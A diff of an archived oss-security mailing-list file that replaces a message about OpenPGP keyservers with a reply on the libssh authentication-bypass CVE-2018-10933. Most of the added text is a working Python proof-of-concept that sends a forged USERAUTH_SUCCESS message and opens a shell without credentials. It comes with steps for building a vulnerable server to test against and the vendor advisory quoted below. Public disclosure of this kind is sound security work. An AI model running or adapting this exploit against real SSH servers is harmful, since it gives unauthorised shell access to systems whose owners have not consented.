@@ -1,31 +1,76 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/28/11
-Message-ID: <87sh2y5tnf.fsf@fifthhorseman.net>
-Date: Tue, 28 Aug 2018 12:43:16 -0400
-From: Daniel Kahn Gillmor <dkg@...thhorseman.net>
-To: Phil Pennock <oss-security-phil@...dhuis.org>, oss-security@...ts.openwall.com
-Cc: Jakub Wilk <jwilk@...lk.net>
-Subject: Re: Travis CI MITM RCE
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/17/5
+Message-ID: <ec0cb776-0caf-c27e-dcff-ff68001900c2@gmail.com>
+Date: Wed, 17 Oct 2018 16:13:24 +0700
+From: Minh Tuan Luong <not.soledad@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: CVE-2018-10933: libssh: authentication bypass in server code
 Content-Type: text/plain; charset=utf-8
 
-On Sat 2018-08-25 20:56:59 -0400, Phil Pennock wrote:
-> The keyservers are a swamp; if you want to include one key, then include
-> the key as static data in your builds/CI configuration, so that it's
-> coming from a trusted source each time: your own data.
+I have coded a simple POC for this CVE:
 
-This is great advice, and not just for builds/CI configuration.
+--- CVE-2018-10933.py ----
 
-I made a similar suggestion recently to clean up the starttls-everywhere
-datafile updater:
+import paramiko
+import socket
+import sys
 
-    https://github.com/EFForg/starttls-everywhere/pull/65/commits/eb0a28e3fa141d4fb445c00df3ab7f3765ded859
+nbytes = 4096
+hostname = "127.0.0.1"
+port = 2222
 
-In some ways, the keyserver network has done the OpenPGP community a
-disservice, by encouraging OpenPGP users to refer to keys by
-fingerprints (or even worse, by key IDs).  While this is a useful
-shorthand in some contexts, it's really a security/reliability
-anti-pattern when it comes to secure programming.
+sock = socket.socket()
+try:
+     sock.connect((hostname, port))
+     # instantiate transport
+     m = paramiko.message.Message()
+     transport = paramiko.transport.Transport(sock)
+     transport.start_client()
 
-      --dkg
+     m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
+     transport._send_message(m)
 
-Download attachment "signature.asc" of type "application/pgp-signature" (228 bytes)
+     cmd_channel = transport.open_session()
+     cmd_channel.invoke_shell()
+
+except socket.error:
+     print '[-] Connecting to host failed. Please check the specified 
+host and port.'
+     sys.exit(1)
+
+-----
+
+to test this code: get vulnerable version of libssh at homepage: 
+https://www.libssh.org/files/0.7/libssh-0.7.4.tar.xz
+after uncompress and build, go to example directory, there's a simple 
+sshd server using libssh name: samplesshd-cb
+
+run this simple sshd by command:
+     $ samplesshd-cb 127.0.0.1 -p 2222
+then run my code, output will be:
+Allocated session channel
+Allocated shell
+mean that i can bypass authentication and spawn a shell without any 
+credential
+
+Regard, Soledad
+
+On 10/16/2018 7:21 PM, Marcus Meissner wrote:
+> Hi,
+>
+> https://www.libssh.org/2018/10/16/libssh-0-8-4-and-0-7-6-security-and-bugfix-release/
+>
+> -----
+> libssh 0.8.4 and 0.7.6 security and bugfix release
+>
+> This is an important security and maintenance release in order to address CVE-2018-10933.
+>
+> libssh versions 0.6 and above have an authentication bypass vulnerability in the server code. By presenting the server an SSH2_MSG_USERAUTH_SUCCESS message in place of the SSH2_MSG_USERAUTH_REQUEST message which the server would expect to initiate authentication, the attacker could successfully authentciate without any credentials.
+>
+> The bug was discovered by Peter Winter-Smith of NCC Group.
+> -----
+>
+> This only affects libssh operating in _server_ mode, but not the usual used client mode.
+>
+> Ciao, Marcus
+
